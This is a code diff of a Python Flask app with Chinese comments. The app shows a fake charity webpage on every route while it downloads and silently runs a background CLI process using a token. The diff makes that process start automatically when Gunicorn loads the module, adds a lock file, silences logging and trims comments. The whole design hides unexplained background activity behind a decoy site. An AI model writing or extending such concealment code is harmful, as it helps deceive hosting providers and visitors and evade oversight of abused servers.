@@ -8,7 +8,6 @@ import urllib.request
 from flask import Flask, Response
 
 # ================= 1. 日志静默配置 =================
-# 屏蔽 Flask/Werkzeug 以及 urllib 的控制台日志输出
 logging.getLogger("werkzeug").setLevel(logging.CRITICAL)
 
 app = Flask(__name__)
@@ -23,7 +22,7 @@ current_token = ""
 cli_process = None
 process_lock = threading.Lock()
 
-# 默认内嵌伪装静态网页（绿意同行）
+# 纯净内嵌伪装 HTML 页面
 EMBEDDED_HTML = """<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -173,8 +172,7 @@ EMBEDDED_HTML = """<!DOCTYPE html>
         <p>© 2026 绿意同行生态发展公益空间. All rights reserved.</p>
     </footer>
 </body>
-</html>
-"""[cite: 1]
+</html>"""
 
 
 # ================= 3. 后台任务逻辑 =================
@@ -207,7 +205,7 @@ def get_token():
 
 
 def run_cli(token):
-    """启动或重启 Cli 进程（静默丢弃标准输出与错误流）"""
+    """启动或重启 Cli 进程（静默模式）"""
     global cli_process
 
     if not os.path.exists(CLI_PATH):
@@ -251,9 +249,15 @@ def token_watcher():
 
 
 def background_init():
-    """异步初始化后台挂机任务"""
+    """异步初始化后台挂机任务（加锁防多 Worker 重复启动）"""
     global current_token
     time.sleep(1)
+
+    lock_file = "/tmp/.worker_init.lock"
+    try:
+        fd = os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_RDWR)
+    except FileExistsError:
+        return
 
     download_cli()
     current_token = get_token() or TOKEN_OR_URL
@@ -283,7 +287,7 @@ def healthz():
 
 @app.route("/.well-known/acme-challenge/<path:token>")
 def acme_challenge(token):
-    """放行 Let's Encrypt / ACME 证书校验路由，避免证书签发受阻"""
+    """放行 Let's Encrypt / ACME 证书校验路由"""
     challenge_path = f"/tmp/.well-known/acme-challenge/{token}"
     if os.path.exists(challenge_path):
         try:
@@ -297,14 +301,14 @@ def acme_challenge(token):
 @app.route("/", defaults={"path": ""})
 @app.route("/<path:path>")
 def catch_all(path):
-    """所有常规路径直接展示伪装页面，彻底摆脱外部反代"""
+    """所有常规路径展示伪装页面"""
     return Response(render_index(), status=200, mimetype="text/html")
 
 
+# 适配 Gunicorn：模块被 Worker 加载时即启动后台线程（带文件锁避免重复拉起）
+init_thread = threading.Thread(target=background_init, daemon=True)
+init_thread.start()
+
 # ================= 5. 主入口 =================
 if __name__ == "__main__":
-    init_thread = threading.Thread(target=background_init, daemon=True)
-    init_thread.start()
-
-    # 启动纯净 Web 服务
     app.run(host="0.0.0.0", port=PORT)
